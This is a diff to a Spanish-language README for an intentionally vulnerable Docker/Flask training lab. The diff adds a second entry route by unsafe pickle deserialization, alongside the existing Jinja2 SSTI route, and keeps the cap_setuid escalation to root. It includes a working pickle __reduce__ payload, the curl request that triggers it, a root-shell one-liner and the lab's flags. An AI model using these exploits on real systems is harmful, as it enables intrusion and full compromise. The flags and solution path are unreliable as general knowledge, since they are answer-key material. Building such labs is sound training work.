@@ -3,14 +3,15 @@
 > **Solo para uso de entrenamiento autorizado.** Vulnerable a propósito. Escucha
 > solo en `127.0.0.1`. No lo expongas a ninguna red no confiable.
 
-Un contenedor Docker con un pequeño panel de estado en Flask. El alumno encadena:
-recon HTTP → **SSTI** en Jinja2 (RCE como `app`) → escalada de privilegios por
-**cap_setuid** → `root` → flag en `/root/flag.txt`.
+Un contenedor Docker con un pequeño panel de estado en Flask. Hay **dos vías de
+entrada** a una shell como `app`, y una escalada compartida:
+recon HTTP → (**SSTI** en Jinja2 **o** **deserialización insegura** con pickle) →
+RCE como `app` → escalada por **cap_setuid** → `root` → flag en `/root/flag.txt`.
 
 ## Servicio
 | Puerto | Servicio | Rol |
 |--------|----------|-----|
-| 5000 | Flask (Python) | SSTI → RCE; privesc por una copia de python con capabilities |
+| 5000 | Flask (Python) | entrada #1 SSTI (`/greet`) · entrada #2 pickle (`/api/prefs`); privesc por copia de python con capabilities |
 
 ## Ejecución
 Preferí el launcher de la raíz (`../lab.sh` / `../lab.ps1`), que levanta este lab
@@ -41,6 +42,30 @@ docker compose down && docker compose up -d --build
    /usr/local/bin/pythonpriv -c 'import os;os.setuid(0);os.execl("/bin/bash","bash","-p")'
    cat /root/flag.txt
    ```
+
+## Vía alternativa de entrada — deserialización insegura (pickle)
+El código fuente de la landing también menciona el endpoint `/api/prefs`, que
+restaura "preferencias" desde un valor `prefs` en base64 que pasa por
+`pickle.loads`. Eso es **deserialización insegura** → RCE como `app` (misma shell
+que el SSTI; desde ahí se usa el mismo privesc por `cap_setuid`).
+
+1. **Descubrir el formato** — `GET /api/prefs` sin parámetros devuelve un ejemplo
+   del valor pickled esperado.
+2. **Construir el payload** — un objeto cuyo `__reduce__` ejecuta un comando:
+   ```python
+   import pickle, base64, subprocess
+   class E:
+       def __reduce__(self):
+           return (subprocess.check_output, (["id"],))
+   print(base64.b64encode(pickle.dumps(E())).decode())
+   ```
+3. **Disparar** — enviar el base64 en `?prefs=` (o en la cookie `prefs`):
+   ```bash
+   curl "http://172.31.0.10:5000/api/prefs?prefs=<base64>"
+   # Preferences loaded: b'uid=1000(app) ...'
+   ```
+   Para un shell interactivo, usar un payload de reverse shell en `__reduce__`.
+   Luego continuar con el privesc de `cap_setuid`.
 
 ## Flags
 - user: `FLAG{ssti_rce_as_app_via_jinja2}`
